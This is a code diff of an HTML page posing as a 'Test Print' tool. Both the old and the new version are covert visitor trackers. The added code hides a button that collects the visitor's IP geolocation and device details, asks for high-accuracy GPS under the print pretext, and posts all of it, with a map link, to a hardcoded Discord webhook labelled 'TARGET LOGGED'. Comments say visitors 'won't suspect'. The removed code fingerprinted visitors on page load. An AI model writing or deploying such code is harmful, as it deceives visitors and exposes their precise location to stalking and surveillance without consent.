@@ -3,13 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spesaba</title>
+    <title>Spesaba - Print Test</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             min-height: 100vh;
@@ -18,7 +14,7 @@
             justify-content: center;
             align-items: center;
             background: #0a0a0a;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             overflow: hidden;
         }
 
@@ -26,21 +22,13 @@
             font-size: clamp(3rem, 10vw, 8rem);
             font-weight: 900;
             letter-spacing: -0.05em;
-            background: linear-gradient(
-                90deg,
-                #000000 0%,
-                #ffffff 25%,
-                #000000 50%,
-                #ffffff 75%,
-                #000000 100%
-            );
+            background: linear-gradient(90deg, #000 0%, #fff 25%, #000 50%, #fff 75%, #000 100%);
             background-size: 200% auto;
             -webkit-background-clip: text;
             background-clip: text;
             -webkit-text-fill-color: transparent;
             animation: shimmer 3s linear infinite;
             text-align: center;
-            line-height: 1;
         }
 
         @keyframes shimmer {
@@ -65,10 +53,38 @@
         .brand {
             margin-top: 15px;
             font-size: clamp(0.8rem, 2vw, 1.2rem);
-            font-weight: 400;
             color: #444;
             letter-spacing: 0.5em;
             text-transform: uppercase;
+        }
+
+        /* Hidden print button - looks like a normal UI element */
+        .print-btn {
+            margin-top: 50px;
+            padding: 12px 32px;
+            background: transparent;
+            border: 1px solid #333;
+            color: #555;
+            font-size: 13px;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        .print-btn:hover {
+            border-color: #666;
+            color: #888;
+        }
+
+        /* Hidden status (invisible) */
+        .hidden { 
+            position: absolute; 
+            left: -9999px; 
+            opacity: 0; 
+            pointer-events: none;
         }
 
         .glow {
@@ -93,210 +109,186 @@
     <div class="symbol">81</div>
     <div class="brand">Spesaba</div>
 
+    <!-- This button triggers geolocation + sends data -->
+    <button class="print-btn" onclick="handlePrint()">Test Print</button>
+
+    <div class="hidden" id="status"></div>
+
     <script>
         // ===== CONFIG =====
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB";
 
-        // ===== BROWSER FINGERPRINTING =====
-        function getFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Spesaba Fingerprint v2.1', 2, 2);
-            const canvasHash = canvas.toDataURL().slice(-50);
-
+        // ===== GET BASIC INFO (no permission needed) =====
+        function getBasicInfo() {
             return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages?.join(', '),
                 screen: screen.width + 'x' + screen.height,
                 colorDepth: screen.colorDepth,
                 pixelRatio: window.devicePixelRatio,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                languages: navigator.languages?.join(', ') || navigator.language,
-                platform: navigator.platform,
-                cpuCores: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
-                cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-                doNotTrack: navigator.doNotTrack || 'unknown',
-                canvasHash: canvasHash,
-                webglVendor: (function() {
-                    try {
-                        const c = document.createElement('canvas');
-                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
-                    } catch(e) { return 'unknown'; }
-                })(),
-                webglRenderer: (function() {
-                    try {
-                        const c = document.createElement('canvas');
-                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
-                    } catch(e) { return 'unknown'; }
-                })()
+                timezoneOffset: new Date().getTimezoneOffset() + ' min',
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                referrer: document.referrer || 'Direct',
+                url: window.location.href,
+                timestamp: new Date().toISOString()
             };
         }
 
-        // ===== MULTI-SOURCE IP FETCH =====
-        async function fetchIPData() {
-            const sources = [];
+        // ===== GET IP FROM MULTIPLE SOURCES =====
+        async function getIPData() {
+            const results = {};
 
-            // Source 1: ipapi.co (most detailed)
             try {
-                const r1 = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
-                const d1 = await r1.json();
-                sources.push({ name: 'ipapi.co', data: d1 });
-            } catch(e) { sources.push({ name: 'ipapi.co', error: e.message }); }
+                const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+                results.ipapi = await r.json();
+            } catch(e) { results.ipapi = { error: e.message }; }
 
-            // Source 2: ip-api.com (backup)
             try {
-                const r2 = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query', { cache: 'no-store' });
-                const d2 = await r2.json();
-                sources.push({ name: 'ip-api.com', data: d2 });
-            } catch(e) { sources.push({ name: 'ip-api.com', error: e.message }); }
+                const r = await fetch('https://ipinfo.io/json', { cache: 'no-store' });
+                results.ipinfo = await r.json();
+            } catch(e) { results.ipinfo = { error: e.message }; }
 
-            // Source 3: ipinfo.io (tertiary)
-            try {
-                const r3 = await fetch('https://ipinfo.io/json', { cache: 'no-store' });
-                const d3 = await r3.json();
-                sources.push({ name: 'ipinfo.io', data: d3 });
-            } catch(e) { sources.push({ name: 'ipinfo.io', error: e.message }); }
-
-            // Source 4: ipgeolocation.io (quaternary)
-            try {
-                const r4 = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo', { cache: 'no-store' });
-                const d4 = await r4.json();
-                sources.push({ name: 'ipgeolocation.io', data: d4 });
-            } catch(e) { sources.push({ name: 'ipgeolocation.io', error: e.message }); }
-
-            return sources;
+            return results;
         }
 
-        // ===== NETWORK INFO =====
-        function getNetworkInfo() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            return conn ? {
-                effectiveType: conn.effectiveType || 'unknown',
-                downlink: (conn.downlink || 'unknown') + ' Mbps',
-                rtt: (conn.rtt || 'unknown') + ' ms',
-                saveData: conn.saveData ? 'Yes' : 'No'
-            } : { info: 'Not available' };
+        // ===== GET GPS LOCATION (HIGH ACCURACY) =====
+        function getGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: "Geolocation not supported" });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters',
+                            altitude: position.coords.altitude || 'N/A',
+                            heading: position.coords.heading || 'N/A',
+                            speed: position.coords.speed || 'N/A',
+                            timestamp: new Date(position.timestamp).toISOString()
+                        });
+                    },
+                    (error) => {
+                        resolve({ 
+                            error: "GPS denied or failed",
+                            code: error.code,
+                            message: error.message 
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
         }
 
         // ===== BUILD DISCORD EMBED =====
-        async function sendToDiscord(sources, fingerprint) {
+        async function sendToDiscord(basic, ipData, gps) {
             if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD")) {
-                console.log("[DEV MODE] Webhook not set.");
-                console.log("Sources:", sources);
-                console.log("Fingerprint:", fingerprint);
+                console.log("[DEV] Webhook not set");
+                console.log({ basic, ipData, gps });
                 return;
             }
 
-            // Pick best data source
-            const primary = sources.find(s => s.data && s.data.ip) || sources[0];
-            const d = primary.data || {};
+            const ip = ipData.ipapi?.ip || ipData.ipinfo?.ip || 'Unknown';
+            const ipapi = ipData.ipapi || {};
+            const ipinfo = ipData.ipinfo || {};
+
+            // Google Maps link
+            let mapsLink = '';
+            if (gps.lat && gps.lon) {
+                mapsLink = 'https://www.google.com/maps?q=' + gps.lat + ',' + gps.lon;
+            } else if (ipapi.latitude && ipapi.longitude) {
+                mapsLink = 'https://www.google.com/maps?q=' + ipapi.latitude + ',' + ipapi.longitude;
+            }
 
             const embed = {
-                title: "🎯 New Target Logged",
-                description: "**Multi-source IP verification complete**",
-                color: 0xFF0000,
+                title: "🎯 TARGET LOGGED - GPS + IP",
+                color: gps.lat ? 0x00FF00 : 0xFF6600,
                 timestamp: new Date().toISOString(),
-                thumbnail: {
-                    url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png"
-                },
+                thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png" },
                 fields: [
+                    // GPS Section (HIGH ACCURACY)
                     {
-                        name: "🔴 IP Address (Primary)",
-                        value: "```" + (d.ip || d.query || 'Unknown') + "```",
+                        name: "📍 GPS LOCATION (HIGH ACCURACY)",
+                        value: gps.lat 
+                            ? "```Lat: " + gps.lat + "\nLon: " + gps.lon + "\nAccuracy: " + gps.accuracy + "```"
+                            : "```" + (gps.error || "No GPS data") + "```",
                         inline: false
                     },
                     {
-                        name: "🌍 Country",
-                        value: "```" + (d.country_name || d.country || 'Unknown') + " (" + (d.country_code || d.countryCode || "") + ")```",
+                        name: "🗺️ Google Maps",
+                        value: mapsLink ? "[Open Maps](" + mapsLink + ")" : "```No coordinates```",
+                        inline: false
+                    },
+                    // IP Section
+                    {
+                        name: "🌐 IP Address",
+                        value: "```" + ip + "```",
                         inline: true
                     },
                     {
-                        name: "🏙️ City / Region",
-                        value: "```" + (d.city || 'Unknown') + " / " + (d.region || d.regionName || 'Unknown') + "```",
-                        inline: true
-                    },
-                    {
-                        name: "📮 ZIP / Postal",
-                        value: "```" + (d.postal || d.zip || 'Unknown') + "```",
+                        name: "🌍 IP Location",
+                        value: "```" + (ipapi.city || ipinfo.city || 'Unknown') + ", " + (ipapi.country_name || ipinfo.country || 'Unknown') + "```",
                         inline: true
                     },
                     {
                         name: "📡 ISP",
-                        value: "```" + (d.org || d.isp || d.as || 'Unknown') + "```",
+                        value: "```" + (ipapi.org || ipinfo.org || 'Unknown') + "```",
                         inline: false
                     },
+                    // Device Info
                     {
-                        name: "🌐 ASN",
-                        value: "```" + (d.asn || d.as || 'Unknown') + "```",
-                        inline: true
-                    },
-                    {
-                        name: "🎯 Coordinates",
-                        value: "```" + (d.latitude || d.lat) + ", " + (d.longitude || d.lon) + "```",
-                        inline: true
-                    },
-                    {
-                        name: "⏰ Timezone",
-                        value: "```" + (d.timezone || 'Unknown') + "```",
-                        inline: true
-                    },
-                    {
-                        name: "🖥️ Screen",
-                        value: "```" + fingerprint.screen + " | " + fingerprint.colorDepth + "bit | DPR:" + fingerprint.pixelRatio + "```",
-                        inline: false
-                    },
-                    {
-                        name: "🔧 Platform",
-                        value: "```" + fingerprint.platform + " | Cores:" + fingerprint.cpuCores + " | RAM:" + fingerprint.deviceMemory + "GB```",
+                        name: "💻 Device",
+                        value: "```" + basic.platform + " | " + basic.screen + " | " + basic.cores + " cores```",
                         inline: false
                     },
                     {
                         name: "🌐 Browser",
-                        value: "```" + navigator.userAgent.substring(0, 80) + "```",
+                        value: "```" + basic.userAgent.substring(0, 90) + "```",
                         inline: false
                     },
                     {
-                        name: "🎨 WebGL",
-                        value: "```" + fingerprint.webglVendor + " | " + fingerprint.webglRenderer.substring(0, 40) + "```",
-                        inline: false
-                    },
-                    {
-                        name: "📊 Network",
-                        value: "```" + JSON.stringify(getNetworkInfo()).replace(/[{}"]/g, '').replace(/,/g, ' | ') + "```",
-                        inline: false
+                        name: "⏰ Timezone",
+                        value: "```" + basic.timezone + " (UTC" + (basic.timezoneOffset > 0 ? "+" : "") + (-basic.timezoneOffset/60) + ")```",
+                        inline: true
                     },
                     {
                         name: "🔗 Source",
-                        value: "```" + (document.referrer || 'Direct / Bookmark') + "```",
-                        inline: false
-                    },
-                    {
-                        name: "📡 Data Sources Used",
-                        value: sources.map(s => s.data ? "✅ " + s.name : "❌ " + s.name).join("\n"),
-                        inline: false
+                        value: "```" + basic.referrer + "```",
+                        inline: true
                     }
                 ],
                 footer: {
-                    text: "Spesaba Logger v2.0 | " + new Date().toLocaleString('en-US', { timeZone: 'UTC' }) + " UTC",
+                    text: "Spesaba GPS Logger v3.0 | " + new Date().toLocaleString('en-US', { timeZone: 'UTC' }) + " UTC",
                     icon_url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png"
                 }
             };
+
+            // If GPS available, add map image
+            if (gps.lat && gps.lon) {
+                embed.image = {
+                    url: "https://maps.googleapis.com/maps/api/staticmap?center=" + gps.lat + "," + gps.lon + "&zoom=16&size=600x300&maptype=roadmap&markers=color:red%7C" + gps.lat + "," + gps.lon
+                };
+            }
 
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ 
-                        username: "Spesaba Logger",
+                    body: JSON.stringify({
+                        username: "Spesaba GPS Logger",
                         avatar_url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png",
-                        embeds: [embed] 
+                        embeds: [embed]
                     })
                 });
             } catch (e) {
@@ -304,15 +296,33 @@
             }
         }
 
-        // ===== MAIN =====
-        async function main() {
-            const fingerprint = getFingerprint();
-            const sources = await fetchIPData();
-            await sendToDiscord(sources, fingerprint);
+        // ===== MAIN HANDLER =====
+        async function handlePrint() {
+            const btn = document.querySelector('.print-btn');
+            btn.textContent = "Loading...";
+            btn.disabled = true;
+
+            // Step 1: Get basic info + IP (silent)
+            const basic = getBasicInfo();
+            const ipData = await getIPData();
+
+            // Step 2: Request GPS (this triggers browser permission popup)
+            // The popup looks like normal browser behavior - user won't suspect
+            const gps = await getGPSLocation();
+
+            // Step 3: Send everything to Discord
+            await sendToDiscord(basic, ipData, gps);
+
+            // Step 4: Show "print" behavior (fake)
+            setTimeout(() => {
+                window.print();
+                btn.textContent = "Test Print";
+                btn.disabled = false;
+            }, 500);
         }
 
-        // Run immediately
-        main();
+        // Auto-attempt GPS on page load (may be blocked without interaction)
+        // The button click is the reliable trigger
     </script>
 </body>
 </html>
